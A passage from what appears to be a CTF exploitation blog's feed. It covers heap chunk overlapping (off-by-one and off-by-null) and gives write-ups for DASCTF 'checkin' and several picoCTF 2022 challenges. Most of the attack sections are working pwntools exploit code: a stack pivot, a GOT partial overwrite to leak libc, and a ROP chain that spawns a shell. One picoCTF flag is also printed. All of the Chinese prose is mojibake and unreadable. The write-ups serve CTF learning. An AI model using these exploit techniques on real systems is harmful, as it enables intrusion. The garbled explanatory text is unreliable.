  <li>ÈÄöËøá<code class="language-plaintext highlighter-rouge">off by one</code>ÊºèÊ¥ûÂèØ‰ª•ËΩªÊòìÂú∞ËÆ©<strong>target</strong>Â†ÜÂùóÁöÑ<code class="language-plaintext highlighter-rouge">size</code>ÂèòÂ§ßÔºåÂç≥ÂèØËÆ©<strong>target</strong>ÂåÖÂê´È´òÂú∞ÂùÄÁõ∏ÈÇªÂ†ÜÂùóÁöÑÂÜÖÂÆπ</li>
  <li>ÂêéÁª≠ÁöÑÂà©Áî®ÂèØ‰ª•ÈÖçÂêà<code class="language-plaintext highlighter-rouge">UAF</code>Ôºå<code class="language-plaintext highlighter-rouge">Unlink</code>ÊîªÂáªÁöÑÂà©Áî®</li>
</ul>

<h3 id="‰æãÈ¢ò">‰æãÈ¢òÔºö</h3>

<ul>
  <li><a href="https://github.com/scwuaptx/HITCON-Training/tree/master/LAB/lab13">HITCON Trainging lab13</a></li>
</ul>

<h2 id="off-by-null">Off By Null</h2>

<ul>
  <li>‰ªçÁÑ∂Â≠òÂú®ÂçïÂ≠óËäÇÊ∫¢Âá∫ÔºåÂè™ÊòØÊ∫¢Âá∫ÁöÑÂÄº‰∏∫<code class="language-plaintext highlighter-rouge">'\0'</code>ÔºåÂèØ‰ª•Áº©ÂáèÂ†ÜÂùó</li>
  <li>Êõ¥Â∏∏ËßÑÂú∞ÊòØÂ∞Ü<strong>target</strong>Â†ÜÂùóÁöÑ<code class="language-plaintext highlighter-rouge">prev_inuse</code>ÊØîÁâπÊ∏ÖÈõ∂ÔºåËææÂà∞‰º™ÈÄ†Ë¢´Ê∫¢Âá∫Â†ÜÂùóË¢´freeÁöÑÁä∂ÊÄÅ</li>
  <li>ÂêéÁª≠ÊûÑÈÄ†<code class="language-plaintext highlighter-rouge">prev_size</code>Âíåfake_chunkËøõË°å<code class="language-plaintext highlighter-rouge">unlink</code>ÊîªÂáªÔºå‰ªéËÄåËææÂà∞Â†ÜÂùóÈáçÂè†</li>
</ul>

<h3 id="‰æãÈ¢ò-1">‰æãÈ¢ò</h3>

<ul>
  <li><a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.27/poison_null_byte.c">poison null byte</a></li>
  <li><a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.27/overlapping_chunks.c">overlapping chunks</a></li>
</ul>

<h2 id="mmap-overlapping-chunks">mmap overlapping chunks</h2>

<h3 id="‰æãÈ¢ò-2">‰æãÈ¢ò</h3>

<ul>
  <li>
    <p><a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.27/mmap_overlapping_chunks.c">mmap_overlapping_chunks.c</a></p>

  </li>
</ul>]]></content><author><name>dayfly</name></author><category term="pwn" /><category term="pwn" /><category term="heap" /><category term="chunk overlapping" /><category term="set" /><summary type="html"><![CDATA[Off By One]]></summary></entry><entry><title type="html">2022DASCTF X SU checkin</title><link href="http://localhost:4000/pwn/2022/03/27/2022DASCTF-X-SU-checkin.html" rel="alternate" type="text/html" title="2022DASCTF X SU checkin" /><published>2022-03-27T00:00:00+08:00</published><updated>2022-03-27T00:00:00+08:00</updated><id>http://localhost:4000/pwn/2022/03/27/2022DASCTF-X-SU-checkin</id><content type="html" xml:base="http://localhost:4000/pwn/2022/03/27/2022DASCTF-X-SU-checkin.html"><![CDATA[<h2 id="Ê£ÄÊü•Á®ãÂ∫è">Ê£ÄÊü•Á®ãÂ∫è</h2>

<p>Á®ãÂ∫èËØ≠‰πâÂæàÁÆÄÂçïÔºåbufÊï∞ÁªÑÊúÄÂ§öÊúâ0x10ÁöÑÊ∫¢Âá∫ÔºåNo canaryÔºåÂºÄ‰∫ÜNXÔºåÊ≤°Êúâ‰ªª‰ΩïÁöÑËæìÂá∫ÂáΩÊï∞</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">160</span><span class="p">];</span> <span class="c1">// [rsp+0h] [rbp-A0h] BYREF</span>

  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
  <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0xB0uLL</span><span class="p">);</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<h2 id="ÊÄùË∑Ø">ÊÄùË∑Ø</h2>
<p>Âõ†‰∏∫ËÉΩÊ∫¢Âá∫ÁöÑÊï∞ÊçÆ‰∏çÂ§öÔºåËá™ÁÑ∂ÂÖàËÄÉËôëÊéßÂà∂rbpËøõË°åÊ†àËøÅÁßªÂà∞bssÊÆµÔºåÊ≤°ÊúâËæìÂá∫ÁöÑÂáΩÊï∞ÁöÑËØùÔºåËÄÉËôëÂ∞ÜsetvbufÁöÑgotÂú∞ÂùÄË¶ÜÁõñ‰∏∫putsÂáΩÊï∞ÁöÑÂú∞ÂùÄÔºåÂÆòÊñπÁªôÂá∫‰∫ÜÂØπÂ∫îÁöÑlibcÁâàÊú¨ÔºåÊòØGLIBC 2.31-0ubuntu9.7ÔºåÂèëÁé∞setvbufÂíåputsÂè™Êúâ‰Ωé12‰Ωç‰∏çÂêåÔºåÂè™ÈúÄË¶ÜÁõñÊúÄ‰Ωé2‰∏™Â≠óËäÇÊó¢ÂèØÔºåÁàÜÁ†¥ÁöÑÊ¶ÇÁéáÊòØ1/16„ÄÇÊàêÂäüË¶ÜÁõñÂêéÊâìÂç∞readÂáΩÊï∞ÁöÑgotÂú∞ÂùÄÂ∞±ËÉΩÊãøÂà∞libcÂú∞ÂùÄÔºåÁÑ∂ÂêéÂ∞±ÊòØÂ∏∏ËßÑÁöÑÊãøshell‰∫Ü„ÄÇ
Âà©Áî®ÁöÑÂÖ≥ÈîÆÁÇπÊúâ‰∏§‰∏™ÔºöÊ†àËøÅÁßªÂà∞bssÔºåË¶ÜÁõñsetvbuf‰ªéËÄåleak libc</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">sys</span> <span class="kn">import</span> <span class="n">argv</span>

<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'debug'</span>
<span class="n">context</span><span class="p">.</span><span class="n">os</span> <span class="o">=</span> <span class="s">'linux'</span>
<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
<span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'tmux'</span><span class="p">,</span><span class="s">'splitw'</span><span class="p">,</span><span class="s">'-h'</span><span class="p">]</span>

<span class="n">binary</span> <span class="o">=</span> <span class="s">'./checkin'</span>
<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./checkin'</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./libc.so.6'</span><span class="p">)</span>

<span class="n">s</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sa</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
<span class="n">sl</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sla</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
<span class="n">r</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span><span class="o">=</span><span class="mi">4096</span>           <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
<span class="n">ru</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delims</span>             <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">delims</span><span class="p">)</span>
<span class="n">rl</span>      <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="n">rls</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span><span class="o">=</span><span class="mi">1</span>              <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvlines</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
<span class="n">itr</span>     <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
<span class="n">uu32</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u32</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>
<span class="n">uu64</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u64</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>

<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
        <span class="k">try</span><span class="p">:</span>
                <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>
                <span class="k">if</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s">'r'</span><span class="p">:</span>
                        <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'node4.buuoj.cn'</span><span class="p">,</span> <span class="mi">25751</span><span class="p">)</span>
                <span class="n">bss</span> <span class="o">=</span> <span class="mh">0x404500</span>
                <span class="n">read_start</span> <span class="o">=</span> <span class="mh">0x4011BF</span>
                <span class="n">rdi</span> <span class="o">=</span> <span class="mh">0x0401253</span>
                <span class="n">rsir15</span> <span class="o">=</span> <span class="mh">0x0401251</span>
                <span class="n">rbp</span> <span class="o">=</span> <span class="mh">0x040113d</span>
                <span class="n">leave</span> <span class="o">=</span> <span class="mh">0x4011E2</span>
                <span class="n">rdxr12</span> <span class="o">=</span> <span class="mh">0x119241</span>

                <span class="n">setvbuf_got</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">'setvbuf'</span><span class="p">]</span>
                <span class="n">read</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'read'</span><span class="p">]</span>
                <span class="n">fake_puts</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'setvbuf'</span><span class="p">]</span>
                <span class="n">read_got</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">'read'</span><span class="p">]</span>
                <span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">'setvbuf_got '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">setvbuf_got</span><span class="p">))</span>
                <span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">'fake_puts '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">fake_puts</span><span class="p">))</span>
                <span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">'read_got '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">read_got</span><span class="p">))</span>

                <span class="c1"># read payload to bss
</span>                <span class="n">pay</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'b'</span><span class="o">*</span><span class="mh">0xA0</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">bss</span><span class="o">+</span><span class="mh">0xa0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">read_start</span><span class="p">)</span>
                <span class="n">s</span><span class="p">(</span><span class="n">pay</span><span class="p">)</span>
                <span class="k">print</span><span class="p">(</span><span class="n">pay</span><span class="p">)</span>

                <span class="c1"># overwrite setvbuf_got to puts_got
</span>                <span class="n">make_puts</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rdi</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">rsir15</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">setvbuf_got</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">read</span><span class="p">)</span>
                <span class="c1"># puts_got read_got
</span>                <span class="n">leak_read</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rdi</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">read_got</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">fake_puts</span><span class="p">)</span> <span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">rbp</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">bss</span><span class="o">+</span><span class="mh">0xa0</span><span class="o">+</span><span class="mh">0x100</span><span class="p">)</span><span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">read_start</span><span class="p">)</span>
                <span class="n">exp</span> <span class="o">=</span> <span class="n">make_puts</span> 
                <span class="n">exp</span> <span class="o">+=</span> <span class="n">leak_read</span>
                <span class="k">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">exp</span><span class="p">)))</span>

                <span class="c1"># stack pivoting to bss
</span>                <span class="n">pay2</span> <span class="o">=</span> <span class="n">exp</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0xa0</span><span class="p">,</span> <span class="sa">b</span><span class="s">'b'</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">bss</span><span class="o">-</span><span class="mi">8</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">leave</span><span class="p">)</span>
                <span class="n">s</span><span class="p">(</span><span class="n">pay2</span><span class="p">)</span>
                <span class="k">print</span><span class="p">(</span><span class="n">pay2</span><span class="p">)</span>

                <span class="n">sleep</span><span class="p">(</span><span class="mf">0.2</span><span class="p">)</span>
                <span class="c1"># try to overwrite setvbuf_got[16:0]
</span>                <span class="n">s</span><span class="p">(</span><span class="n">p16</span><span class="p">(</span><span class="mh">0x4450</span><span class="p">))</span>

                <span class="c1"># leak libc
</span>                <span class="n">libc_base</span> <span class="o">=</span> <span class="n">uu64</span><span class="p">(</span><span class="n">ru</span><span class="p">(</span><span class="s">'</span><span class="se">\x7f</span><span class="s">'</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:])</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'read'</span><span class="p">]</span>
                <span class="n">binsh</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s">'/bin/sh'</span><span class="p">))</span>
                <span class="n">execve</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0xE31A0</span>
                <span class="n">pop_rdx_r12_ret</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">rdxr12</span>

                <span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">'libc_base '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
                <span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">'binsh '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">binsh</span><span class="p">))</span>
                <span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">'execve '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">execve</span><span class="p">))</span>

                <span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

                <span class="c1"># execve(rdi='binsh', rsi=0, rdx=0)
</span>                <span class="n">exp2</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">binsh</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">rsir15</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdx_r12_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">execve</span><span class="p">)</span>
                <span class="n">pay3</span> <span class="o">=</span> <span class="n">exp2</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0xa0</span><span class="p">,</span> <span class="sa">b</span><span class="s">'b'</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">bss</span><span class="o">+</span><span class="mh">0x100</span><span class="o">-</span><span class="mi">8</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">leave</span><span class="p">)</span>
                <span class="n">s</span><span class="p">(</span><span class="n">pay3</span><span class="p">)</span>
                <span class="k">print</span><span class="p">(</span><span class="n">pay3</span><span class="p">)</span>

                <span class="n">sl</span><span class="p">(</span><span class="s">'cat flag'</span><span class="p">)</span>
                <span class="n">itr</span><span class="p">()</span>

        <span class="k">except</span><span class="p">:</span>
                <span class="n">p</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
                <span class="k">pass</span>
</code></pre></div></div>

<h2 id="reference">Reference</h2>
<ul>
  <li>
    <p><a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/fancy-rop/">Stack Pivoting</a></p>

  </li>
</ul>]]></content><author><name>dayfly</name></author><category term="pwn" /><category term="pwn" /><category term="stack pivoting" /><summary type="html"><![CDATA[Ê£ÄÊü•Á®ãÂ∫è]]></summary></entry><entry><title type="html">Picoctf_2022 Write-Up</title><link href="http://localhost:4000/pwn/2022/03/27/Picoctf_2022-Write-Up.html" rel="alternate" type="text/html" title="Picoctf_2022 Write-Up" /><published>2022-03-27T00:00:00+08:00</published><updated>2022-03-27T00:00:00+08:00</updated><id>http://localhost:4000/pwn/2022/03/27/Picoctf_2022-Write-Up</id><content type="html" xml:base="http://localhost:4000/pwn/2022/03/27/Picoctf_2022-Write-Up.html"><![CDATA[<h2 id="basic-file-exploit">basic-file-exploit</h2>

<h3 id="ÊÄùË∑Ø">ÊÄùË∑Ø</h3>

<p>ÂÖàÈÄâ<code class="language-plaintext highlighter-rouge">1</code>Èöè‰æøÂÜôÂÖ•Âá†‰∏™Êï∞ÊçÆÔºåÊª°Ë∂≥<code class="language-plaintext highlighter-rouge">inputs != 0</code>ÁöÑË¶ÅÊ±Ç</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="p">(</span><span class="n">inputs</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">"No data yet"</span><span class="p">);</span>
  <span class="k">continue</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>ÁÑ∂ÂêéÈÄâ<code class="language-plaintext highlighter-rouge">2</code>ËæìÂÖ•‰∏çÂê´Êï∞Â≠óÁöÑÂ≠óÁ¨¶‰∏≤Êª°Ë∂≥‰ª•‰∏ãË¶ÅÊ±ÇÔºåÂç≥ÂèØÊãøÂà∞<code class="language-plaintext highlighter-rouge">flag</code></p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="p">((</span><span class="n">entry_number</span> <span class="o">=</span> <span class="n">strtol</span><span class="p">(</span><span class="n">entry</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">10</span><span class="p">))</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
  <span class="n">puts</span><span class="p">(</span><span class="n">flag</span><span class="p">);</span>
  <span class="n">fseek</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">SEEK_END</span><span class="p">);</span>
  <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<h3 id="È¢òËß£ËøáÁ®ã">È¢òËß£ËøáÁ®ã</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  Hi, welcome to my echo chamber!
  Type '1' to enter a phrase into our database
  Type '2' to echo a phrase in our database
  Type '3' to exit the program

  No data given.
  Please put in a valid number
  1
  1
  Please enter your data:
  1234
  1234
  Please enter the length of your data:
  2
  2
  Your entry number is: 1
  Write successful, would you like to do anything else?
  2
  2
  Please enter the entry number of your data:
  ewaeawe
  ewaeawe
  picoCTF{M4K3_5UR3_70_CH3CK_Y0UR_1NPU75_00AAD6B3}
</code></pre></div></div>

<h2 id="buffer-overflow-0">buffer overflow 0</h2>

<h3 id="ÊÄùË∑Ø-1">ÊÄùË∑Ø</h3>

<p>No canaryÔºåÁõ¥Êé•Ê∫¢Âá∫Ëß¶Âèësegmentation faultÊó¢ÂèØ„ÄÇ</p>

<h3 id="exp">EXP</h3>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">sys</span> <span class="kn">import</span> <span class="n">argv</span>

<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'debug'</span>
<span class="n">context</span><span class="p">.</span><span class="n">os</span> <span class="o">=</span> <span class="s">'linux'</span>
<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'i386'</span>
<span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'tmux'</span><span class="p">,</span><span class="s">'splitw'</span><span class="p">,</span><span class="s">'-h'</span><span class="p">]</span>

<span class="n">binary</span> <span class="o">=</span> <span class="s">'./vuln'</span>
<span class="k">if</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s">'r'</span><span class="p">:</span>
        <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'saturn.picoctf.net'</span><span class="p">,</span> <span class="mi">55986</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
        <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>

<span class="n">s</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sa</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
<span class="n">sl</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sla</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
<span class="n">r</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span><span class="o">=</span><span class="mi">4096</span>           <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
<span class="n">ru</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delims</span>             <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">delims</span><span class="p">)</span>
<span class="n">rl</span>      <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="n">itr</span>     <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
<span class="n">uu32</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u32</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>
<span class="n">uu64</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u64</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>

<span class="c1"># trigger segmentation fault
</span><span class="n">sla</span><span class="p">(</span><span class="s">'Input: '</span><span class="p">,</span> <span class="sa">b</span><span class="s">'b'</span><span class="o">*</span><span class="mi">20</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">rl</span><span class="p">())</span>
</code></pre></div></div>

<h2 id="buffer-overflow-1">buffer overflow 1</h2>

<h3 id="ÊÄùË∑Ø-2">ÊÄùË∑Ø</h3>

<p>No canaryÔºåÁÆÄÂçïÁöÑÊ∫¢Âá∫Ë¶ÜÁõñËøîÂõûÂú∞ÂùÄ„ÄÇ</p>

<h3 id="exp-1">EXP</h3>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">sys</span> <span class="kn">import</span> <span class="n">argv</span>

<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'debug'</span>
<span class="n">context</span><span class="p">.</span><span class="n">os</span> <span class="o">=</span> <span class="s">'linux'</span>
<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'i386'</span>
<span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'tmux'</span><span class="p">,</span><span class="s">'splitw'</span><span class="p">,</span><span class="s">'-h'</span><span class="p">]</span>

<span class="n">binary</span> <span class="o">=</span> <span class="s">'./vuln'</span>
<span class="k">if</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s">'r'</span><span class="p">:</span>
